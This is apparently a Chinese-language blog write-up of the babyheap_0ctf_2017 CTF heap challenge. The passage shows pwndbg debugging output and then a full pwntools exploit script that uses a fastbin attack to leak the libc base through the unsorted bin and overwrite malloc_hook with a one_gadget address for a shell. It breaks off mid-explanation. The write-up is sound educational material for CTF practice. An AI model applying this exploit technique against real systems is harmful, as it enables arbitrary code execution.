class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs c">giantbranch@ubuntu:/mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/fastbin-attack/babyheap_0c<br>tf_2017$ gdb babyheap_0ctf_2017<br>GNU <span class="hljs-title function_">gdb</span> <span class="hljs-params">(Ubuntu <span class="hljs-number">7.11</span><span class="hljs-number">.1</span><span class="hljs-number">-0u</span>buntu1~<span class="hljs-number">16.5</span>)</span> 7.11.1<br><span class="hljs-title function_">Copyright</span> <span class="hljs-params">(C)</span> 2016 Free Software Foundation, Inc.<br>License GPLv3+: GNU GPL version 3 or later &lt;http:<span class="hljs-comment">//gnu.org/licenses/gpl.html&gt;</span><br>This is <span class="hljs-built_in">free</span> software: you are <span class="hljs-built_in">free</span> to change and redistribute it.<br>There is NO WARRANTY, to the extent permitted by law.  Type "show copying"<br>and "show warranty" <span class="hljs-keyword">for</span> details.<br>This GDB was configured as "x86_64-linux-gnu".<br>Type "show configuration" <span class="hljs-keyword">for</span> configuration details.<br>For bug reporting instructions, please see:<br>&lt;http:<span class="hljs-comment">//www.gnu.org/software/gdb/bugs/&gt;.</span><br>Find the GDB manual and other documentation resources online at:<br>&lt;http:<span class="hljs-comment">//www.gnu.org/software/gdb/documentation/&gt;.</span><br>For help, type "help".<br>Type "apropos word" to search <span class="hljs-keyword">for</span> commands related to "word"...<br>pwndbg: loaded 175 commands. Type pwndbg [filter] <span class="hljs-keyword">for</span> a <span class="hljs-built_in">list</span>.<br>pwndbg: created $rebase, $ida gdb <span class="hljs-title function_">functions</span> <span class="hljs-params">(can be used with print/<span class="hljs-keyword">break</span>)</span><br>Reading symbols from babyheap_0ctf_2017...<span class="hljs-params">(no debugging symbols found)</span>...done.<br>pwndbg&gt; r<br>Starting program: /mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/fastbin-attack/babyheap_0ctf_2017/babyheap_0ctf_2017 <br>===== Baby Heap in <span class="hljs-number">2017</span> =====<br><span class="hljs-number">1.</span> Allocate<br><span class="hljs-number">2.</span> Fill<br><span class="hljs-number">3.</span> Free<br><span class="hljs-number">4.</span> Dump<br><span class="hljs-number">5.</span> Exit<br>Command: <span class="hljs-number">1</span><br>Size: <span class="hljs-number">20</span><br>Allocate Index <span class="hljs-number">0</span><br><span class="hljs-number">1.</span> Allocate<br><span class="hljs-number">2.</span> Fill<br><span class="hljs-number">3.</span> Free<br><span class="hljs-number">4.</span> Dump<br><span class="hljs-number">5.</span> Exit<br>Command: <span class="hljs-number">2</span><br>Index: <span class="hljs-number">0</span><br>Size: <span class="hljs-number">40</span><br>Content: aaaaaaaaaaaaaaaaaa<br>^C<br>Program received signal SIGINT, Interrupt.<br><span class="hljs-number">0x00007ffff7b04360</span> in __read_nocancel () at ../sysdeps/unix/syscall-template.S:<span class="hljs-number">84</span><br><span class="hljs-number">84</span>	../sysdeps/unix/syscall-template.S: No such file or directory.<br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>───────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────<br> RAX  <span class="hljs-number">0xfffffffffffffe00</span><br> RBX  <span class="hljs-number">0x0</span><br> RCX  <span class="hljs-number">0x7ffff7b04360</span> (__read_nocancel+<span class="hljs-number">7</span>) ◂— cmp    rax, <span class="hljs-number">-0xfff</span><br> RDX  <span class="hljs-number">0x15</span><br> RDI  <span class="hljs-number">0x0</span><br> RSI  <span class="hljs-number">0x555555757023</span> ◂— <span class="hljs-number">0x20fe10000000000</span><br> R8   <span class="hljs-number">0x7ffff7fdd700</span> ◂— <span class="hljs-number">0x7ffff7fdd700</span><br> R9   <span class="hljs-number">0x9</span><br> R10  <span class="hljs-number">0x0</span><br> R11  <span class="hljs-number">0x246</span><br> R12  <span class="hljs-number">0x555555554a40</span> ◂— xor    ebp, ebp<br> R13  <span class="hljs-number">0x7fffffffdd50</span> ◂— <span class="hljs-number">0x1</span><br> R14  <span class="hljs-number">0x0</span><br> R15  <span class="hljs-number">0x0</span><br> RBP  <span class="hljs-number">0x7fffffffdc20</span> —▸ <span class="hljs-number">0x7fffffffdc50</span> —▸ <span class="hljs-number">0x7fffffffdc70</span> —▸ <span class="hljs-number">0x5555555553e0</span> ◂— push   r15<br> RSP  <span class="hljs-number">0x7fffffffdbf8</span> —▸ <span class="hljs-number">0x5555555551fd</span> ◂— mov    qword ptr [rbp - <span class="hljs-number">8</span>], rax<br> RIP  <span class="hljs-number">0x7ffff7b04360</span> (__read_nocancel+<span class="hljs-number">7</span>) ◂— cmp    rax, <span class="hljs-number">-0xfff</span><br>────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────<br> ► <span class="hljs-number">0x7ffff7b04360</span> &lt;__read_nocancel+<span class="hljs-number">7</span>&gt;     cmp    rax, <span class="hljs-number">-0xfff</span><br>   <span class="hljs-number">0x7ffff7b04366</span> &lt;__read_nocancel+<span class="hljs-number">13</span>&gt;    jae    read+<span class="hljs-number">73</span> &lt;<span class="hljs-number">0x7ffff7b04399</span>&gt;<br>    ↓<br>   <span class="hljs-number">0x7ffff7b04399</span> &lt;read+<span class="hljs-number">73</span>&gt;               mov    rcx, qword ptr [rip + <span class="hljs-number">0x2ccad8</span>]<br>   <span class="hljs-number">0x7ffff7b043a0</span> &lt;read+<span class="hljs-number">80</span>&gt;               neg    eax<br>   <span class="hljs-number">0x7ffff7b043a2</span> &lt;read+<span class="hljs-number">82</span>&gt;               mov    dword ptr fs:[rcx], eax<br>   <span class="hljs-number">0x7ffff7b043a5</span> &lt;read+<span class="hljs-number">85</span>&gt;               or     rax, <span class="hljs-number">0xffffffffffffffff</span><br>   <span class="hljs-number">0x7ffff7b043a9</span> &lt;read+<span class="hljs-number">89</span>&gt;               ret    <br> <br>   <span class="hljs-number">0x7ffff7b043aa</span>                         nop    word ptr [rax + rax]<br>   <span class="hljs-number">0x7ffff7b043b0</span> &lt;write&gt;                 cmp    dword ptr [rip + <span class="hljs-number">0x2d2389</span>], <span class="hljs-number">0</span> &lt;<span class="hljs-number">0x7ffff7dd6740</span>&gt;<br>   <span class="hljs-number">0x7ffff7b043b7</span> &lt;write+<span class="hljs-number">7</span>&gt;               jne    write+<span class="hljs-number">25</span> &lt;<span class="hljs-number">0x7ffff7b043c9</span>&gt;<br>    ↓<br>   <span class="hljs-number">0x7ffff7b043c9</span> &lt;write+<span class="hljs-number">25</span>&gt;              sub    rsp, <span class="hljs-number">8</span><br>─────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────<br><span class="hljs-number">00</span>:<span class="hljs-number">0000</span>│ rsp  <span class="hljs-number">0x7fffffffdbf8</span> —▸ <span class="hljs-number">0x5555555551fd</span> ◂— mov    qword ptr [rbp - <span class="hljs-number">8</span>], rax<br><span class="hljs-number">01</span>:<span class="hljs-number">0008</span>│      <span class="hljs-number">0x7fffffffdc00</span> ◂— <span class="hljs-number">0x28</span> <span class="hljs-comment">/* '(' */</span><br><span class="hljs-number">02</span>:<span class="hljs-number">0010</span>│      <span class="hljs-number">0x7fffffffdc08</span> —▸ <span class="hljs-number">0x555555757010</span> ◂— <span class="hljs-number">0x6161616161616161</span> (<span class="hljs-string">'aaaaaaaa'</span>)<br><span class="hljs-number">03</span>:<span class="hljs-number">0018</span>│      <span class="hljs-number">0x7fffffffdc10</span> ◂— <span class="hljs-number">0x13</span><br>... ↓<br><span class="hljs-number">05</span>:<span class="hljs-number">0028</span>│ rbp  <span class="hljs-number">0x7fffffffdc20</span> —▸ <span class="hljs-number">0x7fffffffdc50</span> —▸ <span class="hljs-number">0x7fffffffdc70</span> —▸ <span class="hljs-number">0x5555555553e0</span> ◂— push   r15<br><span class="hljs-number">06</span>:<span class="hljs-number">0030</span>│      <span class="hljs-number">0x7fffffffdc28</span> —▸ <span class="hljs-number">0x555555554f48</span> ◂— jmp    <span class="hljs-number">0x555555554f4e</span><br><span class="hljs-number">07</span>:<span class="hljs-number">0038</span>│      <span class="hljs-number">0x7fffffffdc30</span> ◂— <span class="hljs-number">0x0</span><br>───────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────<br> ► f <span class="hljs-number">0</span>     <span class="hljs-number">7f</span>fff7b04360 __read_nocancel+<span class="hljs-number">7</span><br>   f <span class="hljs-number">1</span>     <span class="hljs-number">5555555551f</span>d<br>   f <span class="hljs-number">2</span>     <span class="hljs-number">555555554f</span>48<br>   f <span class="hljs-number">3</span>     <span class="hljs-number">555555555188</span><br>   f <span class="hljs-number">4</span>     <span class="hljs-number">7f</span>fff7a2d840 __libc_start_main+<span class="hljs-number">240</span><br>Program received signal SIGINT<br>pwndbg&gt; vmmap<br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>    <span class="hljs-number">0x3b0326206000</span>     <span class="hljs-number">0x3b0326207000</span> rw-p     <span class="hljs-number">1000</span> <span class="hljs-number">0</span>      <br>    <span class="hljs-number">0x555555554000</span>     <span class="hljs-number">0x555555556000</span> r-xp     <span class="hljs-number">2000</span> <span class="hljs-number">0</span>      /mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/fastbin-attack/babyheap_0ctf_2017/babyheap_0ctf_2017<br>    <span class="hljs-number">0x555555755000</span>     <span class="hljs-number">0x555555756000</span> r--p     <span class="hljs-number">1000</span> <span class="hljs-number">1000</span>   /mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/fastbin-attack/babyheap_0ctf_2017/babyheap_0ctf_2017<br>    <span class="hljs-number">0x555555756000</span>     <span class="hljs-number">0x555555757000</span> rw-p     <span class="hljs-number">1000</span> <span class="hljs-number">2000</span>   /mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/fastbin-attack/babyheap_0ctf_2017/babyheap_0ctf_2017<br>    <span class="hljs-number">0x555555757000</span>     <span class="hljs-number">0x555555778000</span> rw-p    <span class="hljs-number">21000</span> <span class="hljs-number">0</span>      [heap]<br>    <span class="hljs-number">0x7ffff7a0d000</span>     <span class="hljs-number">0x7ffff7bcd000</span> r-xp   <span class="hljs-number">1</span>c0000 <span class="hljs-number">0</span>      /lib/x86_64-linux-gnu/libc<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7bcd000</span>     <span class="hljs-number">0x7ffff7dcd000</span> ---p   <span class="hljs-number">200000</span> <span class="hljs-number">1</span>c0000 /lib/x86_64-linux-gnu/libc<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7dcd000</span>     <span class="hljs-number">0x7ffff7dd1000</span> r--p     <span class="hljs-number">4000</span> <span class="hljs-number">1</span>c0000 /lib/x86_64-linux-gnu/libc<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7dd1000</span>     <span class="hljs-number">0x7ffff7dd3000</span> rw-p     <span class="hljs-number">2000</span> <span class="hljs-number">1</span>c4000 /lib/x86_64-linux-gnu/libc<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7dd3000</span>     <span class="hljs-number">0x7ffff7dd7000</span> rw-p     <span class="hljs-number">4000</span> <span class="hljs-number">0</span>      <br>    <span class="hljs-number">0x7ffff7dd7000</span>     <span class="hljs-number">0x7ffff7dfd000</span> r-xp    <span class="hljs-number">26000</span> <span class="hljs-number">0</span>      /lib/x86_64-linux-gnu/ld<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7fdc000</span>     <span class="hljs-number">0x7ffff7fdf000</span> rw-p     <span class="hljs-number">3000</span> <span class="hljs-number">0</span>      <br>    <span class="hljs-number">0x7ffff7ff7000</span>     <span class="hljs-number">0x7ffff7ffa000</span> r--p     <span class="hljs-number">3000</span> <span class="hljs-number">0</span>      [vvar]<br>    <span class="hljs-number">0x7ffff7ffa000</span>     <span class="hljs-number">0x7ffff7ffc000</span> r-xp     <span class="hljs-number">2000</span> <span class="hljs-number">0</span>      [vdso]<br>    <span class="hljs-number">0x7ffff7ffc000</span>     <span class="hljs-number">0x7ffff7ffd000</span> r--p     <span class="hljs-number">1000</span> <span class="hljs-number">25000</span>  /lib/x86_64-linux-gnu/ld<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7ffd000</span>     <span class="hljs-number">0x7ffff7ffe000</span> rw-p     <span class="hljs-number">1000</span> <span class="hljs-number">26000</span>  /lib/x86_64-linux-gnu/ld<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7ffe000</span>     <span class="hljs-number">0x7ffff7fff000</span> rw-p     <span class="hljs-number">1000</span> <span class="hljs-number">0</span>      <br>    <span class="hljs-number">0x7ffffffde000</span>     <span class="hljs-number">0x7ffffffff000</span> rw-p    <span class="hljs-number">21000</span> <span class="hljs-number">0</span>      [<span class="hljs-built_in">stack</span>]<br><span class="hljs-number">0xffffffffff600000</span> <span class="hljs-number">0xffffffffff601000</span> r-xp     <span class="hljs-number">1000</span> <span class="hljs-number">0</span>      [vsyscall]<br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure>
<p>再看一下 0x3b0326206000 这片内存区域，确定是程序结构体中指针存放的位置，标注一下：</p>
<p>这里我重新调试了一个gdb</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0xb422b6be0c0</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xb422b6be0d0</span>:	<span class="hljs-number">0x0000000000000001</span>	<span class="hljs-number">0x0000000000000014</span><br>    			#chunk_flag			<span class="hljs-meta">#size</span><br><span class="hljs-number">0xb422b6be0e0</span>:	<span class="hljs-number">0x0000555555757010</span>	<span class="hljs-number">0x0000000000000000</span><br>    			#chunk_data_ptr<br><span class="hljs-number">0xb422b6be0f0</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xb422b6be100</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xb422b6be110</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xb422b6be120</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xb422b6be130</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></tbody></table></figure>
<h2 id="exp-讲解"><a href="#exp-讲解" class="headerlink" title="exp-讲解"></a>exp 讲解</h2>
<p>exp的主要内容如下：</p>
<blockquote>
<p>exp来自@yichen师傅：<a target="_blank" rel="noopener" href="https://www.yuque.com/hxfqg9/bin/bp97ri#sKWXZ">https://www.yuque.com/hxfqg9/bin/bp97ri#sKWXZ</a></p>
</blockquote>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">'debug'</span><br>p = process(<span class="hljs-string">'./babyheap_0ctf_2017_patch'</span>)<br>elf = ELF(<span class="hljs-string">'./babyheap_0ctf_2017_patch'</span>)<br><br><span class="hljs-comment">#首先是定义的一些函数，对应着程序的功能</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">alloc</span>(<span class="hljs-params">size</span>):<br>    p.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    p.sendline(<span class="hljs-string">"1"</span>)<br>    p.recvuntil(<span class="hljs-string">"Size: "</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fill</span>(<span class="hljs-params">idx, content</span>):<br>    p.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    p.sendline(<span class="hljs-string">"2"</span>)<br>    p.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.recvuntil(<span class="hljs-string">"Size: "</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>    p.recvuntil(<span class="hljs-string">"Content: "</span>)<br>    p.send(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    p.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    p.sendline(<span class="hljs-string">"3"</span>)<br>    p.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>(<span class="hljs-params">idx</span>):<br>    p.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    p.sendline(<span class="hljs-string">"4"</span>)<br>    p.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.recvline()<br>    <span class="hljs-keyword">return</span> p.recvline()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">unsorted_offset_arena</span>(<span class="hljs-params">idx</span>):<br>    word_bytes = context.word_size / <span class="hljs-number">8</span><br>    offset = <span class="hljs-number">4</span>  <span class="hljs-comment"># lock</span><br>    offset += <span class="hljs-number">4</span>  <span class="hljs-comment"># flags</span><br>    offset += word_bytes * <span class="hljs-number">10</span>  <span class="hljs-comment"># offset fastbin</span><br>    offset += word_bytes * <span class="hljs-number">2</span>  <span class="hljs-comment"># top,last_remainder</span><br>    offset += idx * <span class="hljs-number">2</span> * word_bytes  <span class="hljs-comment"># idx</span><br>    offset -= word_bytes * <span class="hljs-number">2</span>  <span class="hljs-comment"># bin overlap</span><br>    <span class="hljs-keyword">return</span> offset<br><br><span class="hljs-comment">#首先申请4个fast chunk和1个small chunk</span><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#index0</span><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#index1</span><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#index2</span><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#index3</span><br>alloc(<span class="hljs-number">0x80</span>)<span class="hljs-comment">#index4</span><br><br><span class="hljs-comment">#free两个,这时候会放到fastbins中,而且因为是后进的,所以</span><br><span class="hljs-comment">#fastbin[0]-&gt;index2-&gt;index1-&gt;NULL</span><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br><br><span class="hljs-comment">#这个时候我们去对index0进行fill操作,他就会把index2的指针的末位改成0x80,也就指向了index4</span><br><span class="hljs-comment">#解释一下,前面申请了4块0x10的,加上chunk的一些信息,合起来是0x80</span><br><span class="hljs-comment">#所以把那个末位改成0x80就指向了index4,这样chunk4就被放到了fastbins中</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload += p64(<span class="hljs-number">0x21</span>)<br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload += p64(<span class="hljs-number">0x21</span>)<br>payload += p8(<span class="hljs-number">0x80</span>)<br>fill(<span class="hljs-number">0</span>, payload)<br><br><span class="hljs-comment">#然后再通过index3去进行写入,把index4的大小改成0x21</span><br><span class="hljs-comment">#这么做是因为当申请index4这块内存的时候,他会检查大小是不是fast chunk的范围内</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload += p64(<span class="hljs-number">0x21</span>)<br>fill(<span class="hljs-number">3</span>, payload)<br><br><span class="hljs-comment">#改好index4的大小之后去申请两次，这样就把原来的fastbins中的给申请出来了</span><br>alloc(<span class="hljs-number">0x10</span>)<br>alloc(<span class="hljs-number">0x10</span>)<br><br><span class="hljs-comment">#申请成功之后index2就指向index4</span><br><span class="hljs-comment">#为了让index4能够被放到unsortedbins中,要把它的大小改回来</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload += p64(<span class="hljs-number">0x91</span>)<br>fill(<span class="hljs-number">3</span>, payload)<br><br><span class="hljs-comment">#再申请一个防止index4与top chunk合并了</span><br>alloc(<span class="hljs-number">0x80</span>)<br><br><span class="hljs-comment">#这时候free就会把index4放到unsorted中了</span><br>free(<span class="hljs-number">4</span>)<br><br><span class="hljs-comment">#因为index2是指向index4的，所以直接把index2给dump一下就能拿到index4中前一部分的内容了</span><br><span class="hljs-comment">#main_arena与libc偏移为0x3c4b20(文末有工具算)</span><br><span class="hljs-comment">#再加上main_arena与unsortedbin的偏移,得到unsortedbins与libc的偏移</span><br>unsorted_offset_mainarena=unsorted_offset_arena(<span class="hljs-number">5</span>)<span class="hljs-comment">#这函数还不太明白</span><br>unsorted_addr=u64(dump(<span class="hljs-number">2</span>)[:<span class="hljs-number">8</span>].strip().ljust(<span class="hljs-number">8</span>, <span class="hljs-string">"\x00"</span>))<br>libc_base=unsorted_addr-<span class="hljs-number">0x3c4b20</span>-unsorted_offset_mainarena<br>log.info(<span class="hljs-string">"libc_base: "</span>+<span class="hljs-built_in">hex</span>(libc_base))<br><span class="hljs-comment">#此时因为fastbins中没有了,所以从unsortedbins中找</span><br>alloc(<span class="hljs-number">0x60</span>)<br><br><span class="hljs-comment">#index2还是指向index4那个地方我们可以先释放index4</span><br>free(<span class="hljs-number">4</span>)<br><br><span class="hljs-comment">#然后修改fd指针,通过index2往index4上写为malloc_hook,这样再次申请的时候会分配到这个地址</span><br><span class="hljs-comment">#但问题是我们去申请的时候会检查size是不是 fakefd + 8 == 当前fastbin的大小</span><br><span class="hljs-comment">#这个地址是main_arena-0x40+0xd,具体看后面图片解释</span><br>payload = p64(libc_base+<span class="hljs-number">0x3c4aed</span>)<br>fill(<span class="hljs-number">2</span>, payload)<br><br><span class="hljs-comment">#这时候再去申请两个,第一个是给前面free的index4,第二个就会分配到malloc_hook处</span><br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#index4</span><br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#index6</span><br><br><span class="hljs-comment">#然后往malloc_hook上写one_gadget的地址</span><br>payload = p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br>payload += p64(libc_base+<span class="hljs-number">0x4527a</span>)<br>fill(<span class="hljs-number">6</span>, payload)<br><br><span class="hljs-comment">#再申请一下触发one_gadget</span><br>alloc(<span class="hljs-number">255</span>)<br><br>p.interactive()<br></code></pre></td></tr></tbody></table></figure>
<h3 id="漏洞利用思路"><a href="#漏洞利用思路" class="headerlink" title="漏洞利用思路"></a>漏洞利用思路</h3>
<p>从上面的内容可以看出，主要的漏洞是任意长度堆溢出。由于该程序几乎所有保护都开启了，所以我们必须要有一些泄漏才可以控制程序的流程。基本利用思路如下：</p>
<ul>
<li>利用 unsorted bin 地址泄漏 libc 基地址。（用unsortedbin的原因之后再说）</li>
<li>利用 fastbin attack中的Arbitrary Alloc技术将chunk 分配到 malloc_hook 附近。</li>
</ul>
<h3 id="1-leak-libc-addr"><a href="#1-leak-libc-addr" class="headerlink" title="1-leak-libc-addr"></a>1. leak libc_addr</h3>
<h4 id="1-1-模仿程序功能"><a href="#1-1-模仿程序功能" class="headerlink" title="1-1-模仿程序功能"></a>1-1 模仿程序功能</h4>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">alloc</span>(<span class="hljs-params">size</span>):<br>    p.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    p.sendline(<span class="hljs-string">"1"</span>)<br>    p.recvuntil(<span class="hljs-string">"Size: "</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fill</span>(<span class="hljs-params">idx, content</span>):<br>    p.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    p.sendline(<span class="hljs-string">"2"</span>)<br>    p.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.recvuntil(<span class="hljs-string">"Size: "</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>    p.recvuntil(<span class="hljs-string">"Content: "</span>)<br>    p.send(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    p.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    p.sendline(<span class="hljs-string">"3"</span>)<br>    p.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>(<span class="hljs-params">idx</span>):<br>    p.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    p.sendline(<span class="hljs-string">"4"</span>)<br>    p.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.recvline()<br>    <span class="hljs-keyword">return</span> p.recvline()<br></code></pre></td></tr></tbody></table></figure>
<p>这4个函数分别对应程序的四个主要功能，这里就不多说了。</p>
<h4 id="1-2-申请-5个chunk"><a href="#1-2-申请-5个chunk" class="headerlink" title="1-2-申请-5个chunk"></a>1-2 申请 5个chunk</h4>
<p>由于我们希望使用 unsorted bin 来泄漏 libc 基地址，**所以必须要有 chunk 可以被链接到 unsorted bin 中，所以该 chunk 不能被回收到 fastbin chunk，也不能和 top chunk 相邻。因为后者在不是fastbin 的情况下，会被合并到 top chunk 中。**具体设计如下：</p>
